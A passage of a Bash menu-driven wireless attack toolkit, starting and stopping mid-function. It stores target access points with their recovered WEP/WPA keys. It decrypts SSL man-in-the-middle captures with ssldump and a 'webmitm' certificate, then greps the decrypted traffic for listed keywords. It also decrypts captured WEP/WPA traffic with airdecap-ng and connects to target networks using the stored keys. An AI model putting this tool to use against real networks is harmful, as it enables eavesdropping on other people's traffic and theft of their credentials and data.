	cat ./tmp/olddatabasebottom |grep -v "$STARTKEY" > ./tmp/newdatabasebottom
	echo "---> Creating Updated Entry..."
	sleep 2
	echo "$TESSID:$(echo $TBSSID |cut -d":" -f4,5,6)" > ./tmp/newdatabaseentry
	echo "$(cat ./headers/line1)" >> ./tmp/newdatabaseentry
	date >> ./tmp/newdatabaseentry
	echo "BSSID $TBSSID" >> ./tmp/newdatabaseentry
	echo "ESSID $TESSID" >> ./tmp/newdatabaseentry
	echo "Channel $TCH" >> ./tmp/newdatabaseentry
	echo "Encryption $TENC" >> ./tmp/newdatabaseentry
	if [ "$TENCP" = "$(cat /dev/null)" ]; then
		echo "NULL" > /dev/null
	else
		echo "Cipher $TENCP" >> ./tmp/newdatabaseentry
	fi
	if [ "$TENCCODE" = "$(cat /dev/null)" ]; then
		echo "Key" >> ./tmp/newdatabaseentry
	else
		echo "Key $TENCCODE" >> ./tmp/newdatabaseentry
	fi
	echo "---> Inserting into Database..."
	sleep 1
	cat ./tmp/newdatabasetop > ./logs/$LOG.log
	cat ./tmp/newdatabaseentry >> ./logs/$LOG.log
	cat ./tmp/newdatabasebottom >> ./logs/$LOG.log
	echo "---> Database Updated!"
	sleep 1
	echo
	echo "---> Returning to Main Menu..."
	sleep 1
		Main-Menu
}

					# End Database Update Function--->

					# <--- Start View Log Function

function View-Log {
clear
cat ./headers/viewlogheader
cat ./headers/line1
	echo "Which Log would you like to View?"
 OPTIONS="$(ls ./logs |grep -v 'IDS') Previous-Menu Main-Menu"
	select opt in $OPTIONS; do
		if [ "$opt" = "Previous-Menu" ]; then
			echo
			echo "Returning to Previous Menu..."
			sleep 1
					Target-Options
		elif [ "$opt" = "Main-Menu" ]; then
			echo
			echo "Returning to Main Menu..."
			sleep 1
					Main-Menu
		elif [ "$opt" = "$opt" ]; then
			less ./logs/$opt
				View-Log
		else
			echo "Invalid Selection!"
		fi
	done
}

					# End View Log Function --->

					# <---Start Set Target From Logs Function

function Set-From-Logs {
clear
cat ./headers/setfromlogsheader
cat ./headers/line1
	echo
	echo "---> WEP or WPA Encryped?"
	echo "---> [WEP/WPA]"
	read Q
	if [ "$Q" = "WEP" ]; then
		ENC=WEP
	elif [ "$Q" = "WPA" ]; then
		ENC=WPA
	else
		echo "---> Invalid Entry!"
		echo "---> Please Try Again!"
		sleep 2
			Set-From-Logs
	fi
	echo
	echo "---> Accessing $ENC Logs..."
	if [ "$ENC" = "WEP" ]; then
		echo
		echo "---> Please Select an Access Point."
		 OPTIONS="$(cat ./logs/WEPIDS.log |sort -u) Previous-Menu Main-Menu"
			select opt in $OPTIONS; do
				if [ "$opt" = "Previous-Menu" ]; then
					echo
					echo "---> Returning to Previous Menu..."
						Target-Options
				elif [ "$opt" = "Main-Menu" ]; then
					echo
					echo "---> Returning to Main Menu..."
						Main-Menu
				elif [ "$opt" = "$opt" ]; then
					TARGET=$opt
					ENC=WEP
					logextraction
				else
					echo "---> Invalid Selection!"
				fi
			done
	elif [ "$ENC" = "WPA" ]; then
		echo
		echo "---> Please Select an Access Point."
		 OPTIONS="$(cat ./logs/WPAIDS.log |sort -u) Previous-Menu Main-Menu"
			select opt in $OPTIONS; do
				if [ "$opt" = "Previous-Menu" ]; then
					echo
					echo "---> Returning to Previous Menu..."
						Target-Options
				elif [ "$opt" = "Main-Menu" ]; then
					echo
					echo "---> Returning to Main Menu..."
						Main-Menu
				elif [ "$opt" = "$opt" ]; then
					TARGET=$opt
					ENC=WPA
					logextraction
				else
					echo "---> Invalid Selection!"
				fi
			done
	else
		echo "---> Invalid Selection!"
	fi
}

					# End Set Target From Logs Function--->

					# <---Start Log Extraction Function

function logextraction {
clear
cat ./headers/setfromlogsheader
cat ./headers/line1
	echo
	echo "---> Initalizing Access Point Parameter Extraction..."
	if [ "$ENC" = "WEP" ]; then
		export ISHERE=$(cat ./logs/WEPc.log |grep $TARGET)
		if [ "$ISHERE" = "$(cat /dev/null)" ]; then
			cat ./logs/WEPnc.log > ./tmp/catweplogs
		else
			cat ./logs/WEPc.log > ./tmp/catweplogs
		fi
		FILENAME=catweplogs
		AFTER=7
	elif [ "$ENC" = "WPA" ]; then
		export ISHERE=$(cat ./logs/WPAc.log |grep $TARGET)
		if [ "$ISHERE" = "$(cat /dev/null)" ]; then
			cat ./logs/WPAnc.log > ./tmp/catwpalogs
		else
			cat ./logs/WPAc.log > ./tmp/catwpalogs
		fi
		FILENAME=catwpalogs
		AFTER=8
	else
		echo "---> ERROR! In Database concatenation process!"
		echo "---> Returning to Main Menu..."
		sleep 3
			Main-Menu
	fi
	cat ./tmp/$FILENAME |grep $TARGET -A $AFTER > ./tmp/logtemp
	for TYPES in $(cat ./config/targetspecs); do
		echo "---> Extracting $TYPES..."
		cat ./tmp/logtemp |grep $TYPES |cut -d" " -f 2 > ./tmp/target$TYPES
	done
	export TBSSID=$(cat ./tmp/targetBSSID)
	export TESSID=$(cat ./tmp/targetESSID)
	export TCH=$(cat ./tmp/targetChannel)
	if [ "$(cat ./tmp/targetKey)" = "Key" ]; then
		export TENCCODE=""
	else
		export TENCCODE=$(cat ./tmp/targetKey)
	fi
	export TENC=$(cat ./tmp/targetEncryption)
	export TENCP=$(cat ./tmp/targetCipher)
	for TYPES in $(cat ./config/targetspecs); do
		rm ./tmp/target$TYPES &> /dev/null
	done
	echo
	echo "---> Extraction Complete!"
	echo "---> Setting Target..."
	echo
	echo "     ---> New Target Set! <---"
	cat ./headers/line1
	echo "   Targets BSSID:---$TBSSID"
	echo "   Targets ESSID:---$TESSID"
	echo "   Channel:---------$TCH"
	echo "   Encryption:------$TENC"
	if [ "$TENC" = "WEP" ]; then
		if [ "$(echo $TENCCODE |wc -m)" = "39" ]; then
			echo "   Cipher:----------128 Bit"
		elif [ "$(echo $TENCCODE |wc -m)" -lt "39" ]; then
			echo "   Cipher:----------64 Bit"
		elif [ "$(echo $TENCCODE |wc -m)" -gt "39" ]; then
			echo "   Cipher:----------128 Bit or Higher"
		fi
	elif [ "$TENC" = "WPA" ]; then
		if [ "$TENCP" = "$(cat /dev/null)" ]; then
			echo "   Cipher:----------Not Set!"
		else
			echo "   Cipher:----------$TENCP"
		fi
	fi
	if [ "$TENCCODE" = "$(cat /dev/null)" ]; then
		echo "   Key:-------------Not Set!"
	else
		echo "   Key:-------------$TENCCODE"
	fi
	export PARENT=LOGSET
	cat ./headers/line1
	echo
	echo "---> Press Enter to Return to Main Menu..."
	read ENTER
		Main-Menu		
}

					# End Log Extraction Function--->

					# <---Start Database Entry Removal Log Select Menu Function

function Remove-Log-Entry {
clear
cat ./headers/removelogentryheader
cat ./headers/line1
echo
echo "---> Please Select Log."
 OPTIONS="$(ls ./logs |grep -v IDS) Previous-Menu Main-Menu"
	select opt in $OPTIONS; do
		if [ "$opt" = "Previous-Menu" ]; then
			echo
			echo "---> Returning to Previous Menu..."
			sleep 1
				Target-Options
		elif [ "$opt" = "Main-Menu" ]; then
			echo
			echo "---> Returning to Main Menu..."
			sleep 1
				Main-Menu
		elif [ "$opt" = "$opt" ]; then
			if [ "$opt" = "WEPc.log" ] || [ "$opt" = "WEPnc.log" ]; then
				AFTER=7
				ENC=WEP
				LISTNAME=WEPIDS
			elif [ "$opt" = "WPAc.log" ] || [ "$opt" = "WPAnc.log" ]; then
				AFTER=8
				ENC=WPA
				LISTNAME=WPAIDS
			else
				echo
				echo "---> Error in Determining List Filename!"
				sleep 1
			fi
			FILENAME=$opt
			COUNT=$(cat ./logs/$FILENAME |wc -l)
			selectentryforremoval
		else
			echo
			echo "---> Invalid Selection!"
			echo "---> Try Again!"
			sleep 1
				Remove-Log-Entry
		fi
	done
}

					# End Database Entry Removal Log Select Menu Function--->

					# <---Start Select Database Entry for Removal Function

function selectentryforremoval {
clear
cat ./headers/removelogentryheader
cat ./headers/line1
echo
echo "---> Please Select Entry to Remove."
 OPTIONS="$(cat ./logs/$LISTNAME.log) Previous-Menu Main-Menu"
	select opt in $OPTIONS; do
		if [ "$opt" = "Previous-Menu" ]; then
			echo
			echo "---> Returning to Previous Menu..."
				Remove-Log-Entry
		elif [ "$opt" = "Main-Menu" ]; then
			echo
			echo "---> Returning to Main Menu..."
				Main-Menu
		elif [ "$opt" = "$opt" ]; then
			ENTRY=$opt
			removeentry
		else
			echo
			echo "---> Invalid Selection!"
			echo "---> Try Again!"
			sleep 1
			selectentryforremoval
		fi
	done
}

					# End Select Database Entry for Removal Function--->

					# <---Start Database Entry Removal Function

function removeentry {
clear
cat ./headers/removelogentryheader
cat ./headers/line1
	echo
	echo "---> Accessing $ENC Database..."
	sleep 1
	echo "---> Removing Entry..."
	sleep 1
	cat ./logs/$FILENAME |grep $ENTRY -B $COUNT |grep -v $ENTRY > ./tmp/newdatabasetop
	STARTKEY=$(cat ./logs/$FILENAME |grep $ENTRY -A $AFTER |grep Key)
	cat ./logs/$FILENAME |grep "$STARTKEY" -A $COUNT |grep -v "$STARTKEY" > ./tmp/newdatabasebottom
	echo "---> Entry Removed!"
	echo "---> Writing to Database..."
	sleep 1
	cat ./tmp/newdatabasetop > ./logs/$FILENAME
	cat ./tmp/newdatabasebottom >> ./logs/$FILENAME
	echo "---> Database Alteration Complete!"
	echo "---> Removing Entry from Database Directory..."
	sleep 1
	cat ./logs/$LISTNAME.log |grep -v $ENTRY > ./tmp/new$LISTNAME
	cat ./tmp/new$LISTNAME > ./logs/$LISTNAME.log
	OTHER=$(cat ./logs/${ENC}c.log ./logs/${ENC}nc.log |grep $ENTRY)
	if [ "$OTHER" = "$(cat /dev/null)" ]; then
		echo "NULL" > /dev/null
	else
		echo "$ENTRY" >> ./logs/${ENC}IDS.log
	fi
	echo "---> Entry in Database Removed!"
	sleep 1
	echo
	echo "---> Returning to Target Options..."
		Target-Options
}

					# End Database Entry Removal Function--->

					# <---Start Decoders Menu Function

function Decoders {
clear
cat ./headers/DecodersHeader
cat ./headers/line1
	echo
	echo "What would you like to Decode?"
 OPTIONS="SSL-Decoder WEP-Decoder WPA-Decoder Main-Menu"
	select opt in $OPTIONS; do
		if [ "$opt" = "Main-Menu" ]; then
			echo
			echo "---> Returning to Main Menu..."
				Main-Menu
		elif [ "$opt" = "$opt" ]; then
			$opt
		else
			echo
			echo "---> Invalid Selection!"
			echo "---> Please Try Again!"
			sleep 1
				Decoders
		fi
	done
}

					# End Decoders Menu Function--->

					# <---Start SSL Decoder Menu Function

function SSL-Decoder {
clear
cat ./headers/SSLDecoderHeader
cat ./headers/line1
	echo
	echo "Please Select a SSL Capture File."
 OPTIONS="$(ls ./output/attackdata/lan/sslm/) Previous-Menu Main-Menu"
	select opt in $OPTIONS; do
		if [ "$opt" = "Previous-Menu" ]; then
			echo
			echo "---> Returning to Previous Menu..."
			sleep 1
				Decoders
		elif [ "$opt" = "Main-Menu" ]; then
			echo
			echo "---> Returning to Main Menu..."
			sleep 1
				Main-Menu
		elif [ "$opt" = "$opt" ]; then
			export DATAFILE=$opt
				SSLDECRYPTION
		else
			echo
			echo "---> Invalid Selection!"
			echo "---> Try Again!"
			sleep 1
				SSL
		fi
	done
}

					# End SSL Decoder Menu Function--->

					# <---Start SSL Decryption Function

function SSLDECRYPTION {
clear
cat ./headers/SSLDecoderHeader
cat ./headers/line1
	echo
	echo "---> Would you like to run data extraction afterward?"
	echo "---> [y/n]"
	read Q
	if [ "$Q" = "y" ]; then
		export EXTRACT=TRUE
	elif [ "$Q" = "n" ]; then
		export EXTRACT=FALSE
	else
		echo
		echo "---> Invalid Selection!"
		echo "---> Try Again!"
		sleep 1
			SSLDECRYPTION
	fi
	echo "---> Initalizing Decryption System..."
	if [ -e ./certificates/webmitm.crt ] && [ -e ./output/attackdata/lan/sslm/$DATAFILE ]; then
		echo "---> System Initalization Complete!"
		echo "---> Starting Decryption Sequence..."
			if [ -e ./output/attackdata/lan/sslm/$DATAFILE.decoded ]; then
				echo "---> OverWriting Old File..."
				rm -f ./output/attackdata/lan/sslm/$DATAFILE.decoded &> /dev/null
				ssldump -r ./output/attackdata/lan/sslm/$DATAFILE -k ./certificates/webmitm.crt -d > ./output/attackdata/lan/sslm/$DATAFILE.decoded
			else
				ssldump -r ./output/attackdata/lan/sslm/$DATAFILE -k ./certificates/webmitm.crt -d > ./output/attackdata/lan/sslm/$DATAFILE.decoded
			fi
		echo "---> Decryption Complete!"
		if [ "$EXTRACT" = "TRUE" ]; then
			SSLEXTRACTION
		elif [ "$EXTRACT" = "FALSE" ]; then
			echo "---> Would you like to view the decrypted information?"
			read Q
			if [ "$Q" = "y" ]; then
				kwrite ./output/attackdata/lan/sslm/$DATAFILE.decoded &
				echo
				echo "---> Returning to Main Menu..."
				sleep 1
					Main-Menu
			elif [ "$Q" = "n" ]; then
				echo
				echo "---> Returning to Main Menu..."
				sleep 1
					Main-Menu
			else
				echo
				echo "---> Invalid Selection!"
			fi
		else
			echo "!*!*!*!*! Error! Unable to Determine wether to Extract Data!"
			echo "Trace CallBack"
			echo
			echo "Variable being Called: EXTRACT"
			echo
			echo "Print Variable Value: $EXTRACT"
			echo "Variable should be either TRUE or FALSE"
			echo
			echo "Press Enter to Return to Main Menu"
			read ENTER
				Main-Menu
		fi
	else
		if [ -e ./certificates/webmitm.crt ]; then
			echo "NULL" > /dev/null
		else
			echo "---> SSL Certificate Missing!"
		fi
		if [ -e ./output/attackdata/lan/sslm/$DATAFILE ]; then
			echo "NULL" > /dev/null
		else
			echo "---> Capture File Missing!"
		fi
		echo "---> Press Enter to Return to Main Menu"
		read ENTER
			Main-Menu
	fi
}

					# End SSL Decryption Function--->

					# <---Start SSL Data Extraction Function

function SSLEXTRACTION {
	echo
	echo "---> Initalizing Data Extraction..."
	cat ./output/attackdata/lan/sslm/$DATAFILE.decoded |grep 'application_data' -B 2 -A 15 > ./output/attackdata/lan/sslm/$DATAFILE.main
	echo "---> Searching for Specific Keywords..."
	for WORD in $(cat ./config/keyword.lst); do
		cat ./output/attackdata/lan/sslm/$DATAFILE.decoded |grep $WORD >> ./output/attackdata/lan/sslm/$DATAFILE.keywords
	done
	echo "---> Data Extraction Complete!"
	echo
	echo "---> Would you like to View the output?"
	read Q
	if [ "$Q" = "y" ]; then
		echo
		echo "---> Opening..."
		kwrite ./output/attackdata/lan/sslm/$DATAFILE.decoded &
		kwrite ./output/attackdata/lan/sslm/$DATAFILE.main &
		kwrite ./output/attackdata/lan/sslm/$DATAFILE.keywords &
		echo "---> Returning to Main Menu..."
		sleep 1
			Main-Menu
	elif [ "$Q" = "n" ]; then
		echo
		echo "---> Returning to Main Menu..."
			Main-Menu
	else
		echo
		echo "---> Invalid Selection!"
	fi
}

					# End SSL Data Extraction Function--->

					# <---Start Offline WEP Data Decryption Menu Function

function WEP-Decoder {
clear
cat ./headers/WEPDecryptionMenuHeader
cat ./headers/line1
	echo
	echo "Please Select a WEP Encrypted Datafile."
 OPTIONS="$(cat ./output/data/WEPcap.log |grep -v '\-' |grep -v ':') Previous-Menu Main-Menu"
	select opt in $OPTIONS; do
		if [ "$opt" = "Previous-Menu" ]; then
			echo
			echo "---> Returning to Previous Menu..."
			sleep 1
				Decoders
		elif [ "$opt" = "Main-Menu" ]; then
			echo
			echo "---> Returning to Main Menu..."
			sleep 1
				Main-Menu
		elif [ "$opt" = "$opt" ]; then
			DATAFILE=$opt
			echo
			echo "---> WEP Datafile: $DATAFILE Selected!"
				WEPOFFDECRYPT
		else
			echo
			echo "---> Invalid Selection!"
			sleep 1
			WEP
		fi
	done	
}

					# End Offline WEP Data Decryption Menu Function--->

					# <---Start WEP Data Offline Decryption Function

function WEPOFFDECRYPT {
clear
cat ./headers/WEPDecryptionMenuHeader
cat ./headers/line1
	echo
	echo "---> Accessing AP Specifics..."
	BSSID=$(cat ./output/data/WEPcap.log |grep $DATAFILE -B1 |grep -v $DATAFILE)
	if [ "$BSSID" = "$(cat /dev/null)" ]; then
		if [ "$DATAFILE" = "$(cat /dev/null)" ]; then
			echo
			echo "ERROR!"
			echo
			echo "Unable to Determine Basic Service Set Identifier. (BSSID)"
			echo
			echo "Variable Name: BSSID"
			echo "Variable Value: $BSSID"
			echo
			echo "Unable to Determine Data Filename."
			echo
			echo "Variable Name: DATAFILE"
			echo "Variable Value: $DATAFILE"
			echo
			echo "Press Enter to Return to Main Menu..."
			read ENTER
				Main-Menu
		else
			echo
			echo "ERROR!"
			echo
			echo "Unable to Determine Basic Service Set Identifier. (BSSID)"
			echo
			echo "Variable Name: BSSID"
			echo "Variable Value: $BSSID"
			echo
			echo "Press Enter to Return to Main Menu..."
			read ENTER
				Main-Menu
		fi
	else
		if [ "$DATAFILE" = "$(cat /dev/null)" ]; then
			echo
			echo "ERROR!"
			echo
			echo "Unable to Determine Data Filename."
			echo
			echo "Variable Name: DATAFILE"
			echo "Variable Value: $DATAFILE"
			echo
			echo "Press Enter to Return to Main Menu..."
			read Enter
				Main-Menu
		else
			echo "NULL" > /dev/null
		fi
	fi
	echo "---> Found Access Point Specifics!"
	echo
	echo "BSSID: $BSSID"
	echo "DATAFILE: $DATAFILE"
	echo
	if [ "$TENCCODE" = "$(cat /dev/null)" ]; then
		echo "---> Please Enter Encryption Key for DataFile!"
		echo "-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-"
		read KEY
		echo "-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-"
	else
		if [ "$TBSSID" = "$BSSID" ]; then
			KEY=$TENCCODE
		else
			echo
			echo "---> Please Enter Encryption Key for DataFile!"
			echo "-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-"
			read KEY
			echo "-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-"
		fi
	fi
	echo
	echo "---> Using Encryption Key: $KEY"
	echo
	echo "---> Initalizing WEP Data Decryption..."
	airdecap-ng -b $BSSID -w $KEY ./output/data/$DATAFILE.cap
	echo
	echo "---> WEP Data Decryption Complete!"
	sleep 1
	echo
	echo "---> Would you like to Open the Decrypted Datafile?"
	echo "---> [y/n]"
	read Q
	if [ "$Q" = "y" ]; then
		echo
		echo "---> Opening..."
		wireshark ./output/data/$DATAFILE-dec.cap &
	elif [ "$Q" = "n" ]; then
		echo "NULL" > /dev/null
	else
		echo "--> Invalid Selection!"
	fi
	echo
	echo "---> Press Enter to Return to Main Menu."
	read ENTER
		Main-Menu
}

					# End WEP Data Offline Decryption Function--->

					# <---Start WPA Offline Data Decryption Menu Function

function WPA-Decoder {
clear
cat ./headers/WPADecryptionMenuHeader
cat ./headers/line1
	echo
	echo "Please Select WPA Encrypted Datafile."
 OPTIONS="$(cat ./output/data/WPAcap.log |grep -v '\-' |grep -v ':') Previous-Menu Main-Menu"
	select opt in $OPTIONS; do
		if [ "$opt" = "Previous-Menu" ]; then
			echo
			echo "---> Returning to Previous Menu..."
			sleep 1
				Decoders
		elif [ "$opt" = "Main-Menu" ]; then
			echo
			echo "---> Returning to Main Menu..."
			sleep 1
				Main-Menu
		elif [ "$opt" = "$opt" ]; then
			DATAFILE=$opt
				WPAOFFDECRYTER
		else
			echo
			echo "---> Invalid Selection!"
			echo "---> Please Try Again!"
			sleep 1
				WPA-Decoder
		fi
	done
}

					# End WPA Offline Data Decryption Menu Function--->

					# <---Start WPA Offline Data Decryption Function

function WPAOFFDECRYTER {
clear
cat ./headers/WPADecryptionMenuHeader
cat ./headers/line1
	echo
	echo "---> Accessing AP Specifics..."
	BSSID=$(cat ./output/data/WPAcap.log |grep $DATAFILE -B1 |grep -v $DATAFILE)
	ESSID=$(cat ./output/data/WPAcap.log |grep $DATAFILE -A1 |grep -v $DATAFILE |cut -d":" -f2)
	if [ "$BSSID" = "$(cat /dev/null)" ]; then
		if [ "$DATAFILE" = "$(cat /dev/null)" ]; then
			echo
			echo "ERROR!"
			echo
			echo "Unable to Determine Basic Service Set Identifier. (BSSID)"
			echo
			echo "Variable Name: BSSID"
			echo "Variable Value: $BSSID"
			echo
			echo "Unable to Determine Data Filename."
			echo
			echo "Variable Name: DATAFILE"
			echo "Variable Value: $DATAFILE"
			echo
			echo "Press Enter to Return to Main Menu..."
			read ENTER
				Main-Menu
		else
			echo
			echo "ERROR!"
			echo
			echo "Unable to Determine Basic Service Set Identifier. (BSSID)"
			echo
			echo "Variable Name: BSSID"
			echo "Variable Value: $BSSID"
			echo
			echo "Press Enter to Return to Main Menu..."
			read ENTER
				Main-Menu
		fi
	else
		if [ "$DATAFILE" = "$(cat /dev/null)" ]; then
			echo
			echo "ERROR!"
			echo
			echo "Unable to Determine Data Filename."
			echo
			echo "Variable Name: DATAFILE"
			echo "Variable Value: $DATAFILE"
			echo
			echo "Press Enter to Return to Main Menu..."
			read Enter
				Main-Menu
		else
			echo "NULL" > /dev/null
		fi
	fi
	echo "---> Found Access Point Specifics!"
	echo
	echo "BSSID: $BSSID"
	echo "DATAFILE: $DATAFILE"
	echo
	if [ "$TENCCODE" = "$(cat /dev/null)" ]; then
		echo "---> Please Enter Encryption Key for DataFile!"
		echo "-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-"
		read KEY
		echo "-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-"
	else
		if [ "$TBSSID" = "$BSSID" ]; then
			KEY=$TENCCODE
		else
			echo
			echo "---> Please Enter Encryption Key for DataFile!"
			echo "-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-"
			read KEY
			echo "-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-"
		fi
	fi
	echo
	if [ "$(echo "$KEY" |grep ':' )" = "$(cat /dev/null)" ]; then
		echo "---> Key Detected to be an ASCII Passphrase!"
		echo
		KEYTYPE="-p"
	else
		echo "---> Key Detected to be a Pairwise Master Key (HEX)!"
		echo
		KEYTYPE="-k"
	fi
	echo "---> Using Encryption Key: $KEY"
	echo
	echo "---> Initalizing WPA Data Decryption..."
	airdecap-ng -b $BSSID -e $ESSID $KEYTYPE $KEY ./output/data/$DATAFILE.cap
	echo
	echo "---> WPA Data Decryption Complete!"
	sleep 1
	echo
	echo "---> Would you like to Open the Decrypted Datafile?"
	echo "---> [y/n]"
	read Q
	if [ "$Q" = "y" ]; then
		echo
		echo "---> Opening..."
		wireshark ./output/data/$DATAFILE-dec.cap &
	elif [ "$Q" = "n" ]; then
		echo "NULL" > /dev/null
	else
		echo "--> Invalid Selection!"
	fi
	echo
	echo "---> Press Enter to Return to Main Menu."
	read ENTER
		Main-Menu
}

					# End WPA Offline Data Decryption Function--->

					# <---Start Wifi Connect Menu Function

function Connect {
clear
cat ./headers/connectmenuheader
cat ./headers/line1
	echo
	echo "           ---> Connect or Disconnect? <---"
 OPTIONS="WPA-Connect WEP-Connect Disconnect Main-Menu"
	select opt in $OPTIONS; do
		if [ "$opt" = "WPA-Connect" ]; then
			WEPCONNECT=no
			export PARENT=CONNECT
			Interface-Status-Check
		elif [ "$opt" = "WEP-Connect" ]; then
			WEPCONNECT=yes
			export PARENT=CONNECT
			Interface-Status-Check
		elif [ "$opt" = "Disconnect" ]; then
			Disconnect
		elif [ "$opt" = "Main-Menu" ]; then
			echo
			echo "---> Returning to Main Menu..."
			sleep 2
				Main-Menu
		else
			echo "Invalid Selection!"
			sleep 1
				Connect
		fi
	done
}

					# End Wifi Connect Menu Function --->

					# <---Start Wifi Disconnect Function

function Disconnect {
clear
cat ./headers/disconnectheader
cat ./headers/line1
	echo
	echo "---> Checking..."
	sleep 1
	echo "$(ls /tmp/ |grep pid | grep dhclient |cut -d"." -f2)" > ./tmp/activeinterfaces
	echo "" > ./tmp/connections
	for INTS in $(cat ./tmp/activeinterfaces); do
		echo "-> $INTS is connected to $(iwconfig $INTS |grep ESSID |cut -d'"' -f2)" >> ./tmp/connections
	done
	if [ "$(cat ./tmp/activeinterfaces)" = "$(cat /dev/null)" ]; then
		echo "---> You are Not Currently Connected to an Access Point!"
		sleep 1
		echo "---> Returning to Main Menu..."
		sleep 3
			Main-Menu
	else
		echo
		echo "---> Active Interfaces. <---"
		cat ./tmp/connections
		echo "----------------------------"
		echo
		echo "---> Which Connection would you like to Terminate?"
	 OPTIONS="$(cat ./tmp/activeinterfaces) Main-Menu"
		select opt in $OPTIONS; do
			if [ "$opt" = "Main-Menu" ]; then
				echo
				echo "---> Returning to Main Menu..."
				sleep 2
					Main-Menu
			elif [ "$opt" = "$opt" ]; then
				export TINT=$opt
			 	detecttype
			else
				echo "Invalid Selection!"
			fi
		done
	fi
}

					# End Wifi Disconnect Function --->

					# <---Start Connection Detection Function

function detecttype {
	echo
	echo "---> Detecting Connection Type..."
	sleep 1
	export ISWPA=$(ps ux |grep wpa |grep $TINT)
	if [ "$ISWPA" = "$(cat /dev/null)" ]; then
		export TYPE=WEP
	else
		export TYPE=WPA
	fi
	echo "---> $TYPE Detected!"
	if [ "$TYPE" = "WEP" ]; then
		terminatewep
	elif [ "$TYPE" = "WPA" ]; then
		terminatewpa
	fi
}

					# End Connection Type Detection Function --->

					# <---Start WEP Termination Function

function terminatewep {
	echo "---> Terminating WEP on $TINT..."
	kill $(cat /tmp/dhclient.$TINT.pid)
	#sleep 1
	echo "---> Destroying Cache..."
	rm /tmp/dhclient.$TINT.* &> /dev/null
	sleep 1
	echo "---> Bringing Interface Down..."
	ifconfig $TINT down
	sleep 1
	echo "---> Disconnected!"
	sleep 1
	if [ "$PARENT" = "DESTROY" ]; then
		destroymanagedcont
	else
		echo "---> Press Enter to Return to Main Menu..."
		read ENTER
		echo "---> Returning to Main Menu..."
		sleep 2
			Main-Menu
	fi
}

					# End WEP Termination Function --->

					# <---Start WPA Termination Function

function terminatewpa {
	echo "---> Determining PID..."
	sleep 1
	echo "---> WPA Supplicant PID = $(cat /tmp/wpa_supplicant.$TINT.pid)"
	echo "---> dhclient PID = $(cat /tmp/dhclient.$TINT.pid)"
	echo "---> Shutting Down dhclient..."
	kill $(cat /tmp/dhclient.$TINT.pid) &> /dev/null
	echo "---> Killing WPA..."
	kill $(cat /tmp/wpa_supplicant.$TINT.pid)
	echo "---> Destroying Cache..."
	rm -f /tmp/dhclient.$TINT.* &> /dev/null
	rm -f /tmp/wpa_supplicant.$TINT.pid &> /dev/null
	echo
	echo "---> Disconnected!"
	if [ "$PARENT" = "DESTROY" ]; then
		destroymanagedcont
	else
		echo "---> Press Enter to Return to Main Menu."
		read ENTER
		echo "---> Returning to Main Menu..."
		sleep 2
			Main-Menu
	fi
}

					# <---Start Interface Selection Function

function intselect {
clear
cat ./headers/connectmenuheader
cat ./headers/line1
	echo
	echo "---> Interface?"
	 OPTIONS="$(cat ./tmp/managedinterfaces) Cancel"
		select opt in $OPTIONS; do
			if [ "$opt" = "Cancel" ]; then
				echo
				echo "---> Returning to Main Menu..."
				sleep 2
					Main-Menu
			elif [ "$opt" = "$opt" ]; then
				echo
				export INT=$opt
				echo "---> Interface Set: $INT"
					apselect
			else
				echo
				echo "Invalid Selection!"
				sleep 1
					Connect
			fi
		done
}

					# End Interface Selection Function --->

					# <--- Start Access Point Select Function

function apselect {
	if [ "$TBSSID" = "$(cat /dev/null)" ]; then
		echo
		echo "---> No Target Currently Set!"
		echo 
		echo "---> Would you like to select one from the logs?"
		read ANSWER
		if [ "$ANSWER" = "n" ]; then
			echo 
			echo "---> Returning to Main Menu..."
			sleep 2
				Main-Menu
		elif [ "$ANSWER" = "y" ]; then
			export Q=n
			export QUESTION=FALSE
				logselect
		else
			echo "---> Invalid Selection!"
		fi
	else
		echo
		echo "---> Current Target Network."
		echo
		echo "---> ESSID:----------$TESSID"
		echo "---> BSSID:----------$TBSSID"
		echo "---> Channel:--------$TCH"
		echo "---> Encrypt:--------$TENC"
		if [ "$TENCP" = "$(cat /dev/null)" ]; then
			echo "---> Cipher Suite:---Not Set!"
		else
			echo "---> Cipher Suite:---$TENCP"
		fi
		if [ "$TENCCODE" = "$(cat /dev/null)" ]; then
			echo "---> Key:------------Not Set!"
		else
			echo "---> Key:------------$TENCCODE"
		fi
		echo
		echo "---> Would you like to connect to this target?"
		read Q
		if [ "$TENC" = "WEP" ]; then
			WEPCONNECT=yes
			logselect
		else
			WEPCONNECT=no
			logselect
		fi
	fi
}

					# End Access Point Select Function--->

					# <---Start FROM Logs Select Function
function logselect {
	if [ "$Q" = "n" ]; then
		if [ "$QUESTION" = "FALSE" ]; then
			echo "NULL" > /dev/null
			Q=y
		else
			echo
			echo "---> Would you like to select one from the logs?"
			read Q
		fi
		if [ "$Q" = "y" ]; then
			echo
			echo "---> WEP or WPA?"
			read Q
			if [ "$Q" = "WEP" ]; then
				ENC=$Q
				selectfromlogs
			elif [ "$Q" = "WPA" ]; then
				ENC=$Q
				selectfromlogs
			else
				echo "Invalid Selection!"
				echo "Try Again!"
			fi
		elif [ "$Q" = "n" ]; then
			echo
			echo "---> Returning to Main Menu..."
			sleep 1
				Main-Menu
		else
			echo "Invalid Selection!"
		fi
	elif [ "$Q" = "y" ]; then
		if [ "$WEPCONNECT" = "yes" ]; then
			export PARENT=currenttarget
				wepconnect
		elif [ "$WEPCONNECT" = "no" ]; then
			echo "NULL" > /dev/null
		fi
		echo
		if [ "$TENCCODE" = "$(cat /dev/null)" ]; then
			echo "Encryption Key?"
			read KEY
		else
			KEY=$TENCCODE
		fi
		if [ "$KEY" = "$(cat /dev/null)" ]; then
			echo "---> You Must Enter a key to connect!"
			echo "---> Try Again!"
		else
			echo "NULL" > /dev/null
		fi
		echo "---> Initalizing..."
		sleep 1
		export CIPHER=$TENCP
		if [ "$CIPHER" = "$(cat /dev/null)" ]; then
			echo
			echo "---> No Cipher Suite Set!"
			echo "---> Please Set a Cipher Suite!"
			sleep 2
